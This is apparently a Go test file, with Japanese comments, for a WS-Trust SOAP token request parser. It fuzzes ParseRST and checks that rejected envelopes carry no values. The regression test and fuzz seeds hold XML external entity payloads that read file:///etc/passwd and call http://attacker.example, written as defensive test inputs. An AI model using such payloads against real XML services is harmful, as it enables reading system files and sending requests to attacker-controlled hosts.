package requests_wstrust

import (
	"strings"
	"testing"
	"time"
)

// maxRSTBytes は fuzz target が投入する SOAP body の上限。ParseRST 自身は上限を持たず、
// HTTP 層の body 制限に依存しているため、target 側で明示的に区切る。
const maxRSTBytes = 256 * 1024

const validRST = `<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"` +
	` xmlns:a="http://www.w3.org/2005/08/addressing">` +
	`<s:Header>` +
	`<a:MessageID>urn:uuid:1</a:MessageID>` +
	`<a:To>https://idmagic.example/trust</a:To>` +
	`<a:Action>http://docs.oasis-open.org/ws-sx/ws-trust/200512/Issue</a:Action>` +
	`<Security><UsernameToken><Username>user</Username><Password>secret</Password></UsernameToken>` +
	`<Timestamp><Created>2026-01-01T00:00:00Z</Created><Expires>2026-01-01T00:05:00Z</Expires></Timestamp>` +
	`</Security></s:Header>` +
	`<s:Body><RequestSecurityToken><RequestType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/Issue</RequestType>` +
	`<AppliesTo><EndpointReference><Address>https://rp.example</Address></EndpointReference></AppliesTo>` +
	`</RequestSecurityToken></s:Body></s:Envelope>`

// FuzzParseRST は、拒否した RST から値を持ち出さないことを表明する。
// error と一緒に Username / AppliesTo が埋まった構造体を返すと、呼び出し側が err を握り潰した瞬間に
// 未検証の資格情報と宛先を信頼してしまう。
func FuzzParseRST(f *testing.F) {
	f.Add([]byte(validRST))
	f.Add([]byte(`<s:Envelope`))
	f.Add([]byte(`<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><s:Envelope>&e;</s:Envelope>`))
	f.Add([]byte(``))

	now := time.Date(2026, 1, 1, 0, 1, 0, 0, time.UTC)

	f.Fuzz(func(t *testing.T, body []byte) {
		if len(body) > maxRSTBytes {
			return
		}
		req, err := ParseRST(body, now)
		if err == nil {
			return
		}
		if req != (RequestSecurityToken{}) {
			t.Fatalf("ParseRST returned %+v together with an error", req)
		}
	})
}

// TestParseRSTRejectsExternalEntities は WS-Trust エンベロープの XXE を回帰として固定する。
func TestParseRSTRejectsExternalEntities(t *testing.T) {
	now := time.Date(2026, 1, 1, 0, 1, 0, 0, time.UTC)
	payloads := map[string]string{
		"external file entity": `<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]>` +
			strings.Replace(validRST, "<Username>user</Username>", "<Username>&e;</Username>", 1),
		"external http entity": `<!DOCTYPE r [<!ENTITY e SYSTEM "http://attacker.example/x">]>` +
			strings.Replace(validRST, "<Username>user</Username>", "<Username>&e;</Username>", 1),
		"internal entity expansion": `<!DOCTYPE r [<!ENTITY e "expanded">]>` +
			strings.Replace(validRST, "<Username>user</Username>", "<Username>&e;</Username>", 1),
	}
	for name, payload := range payloads {
		t.Run(name, func(t *testing.T) {
			req, err := ParseRST([]byte(payload), now)
			if err == nil {
				t.Fatalf("expected an entity reference to be rejected, got Username=%q", req.Username)
			}
			if req != (RequestSecurityToken{}) {
				t.Fatalf("rejected envelope still carried values: %+v", req)
			}
		})
	}
}

// TestParseRSTAcceptsValidEnvelope は fuzz target の corpus が実際に受理される形であることを保つ。
// これがないと、oracle が「常に error」でも target は緑のままになる。
func TestParseRSTAcceptsValidEnvelope(t *testing.T) {
	now := time.Date(2026, 1, 1, 0, 1, 0, 0, time.UTC)
	req, err := ParseRST([]byte(validRST), now)
	if err != nil {
		t.Fatalf("expected the seed envelope to parse: %v", err)
	}
	if req.Username != "user" || req.AppliesTo != "https://rp.example" {
		t.Fatalf("unexpected parse result: %+v", req)
	}
}
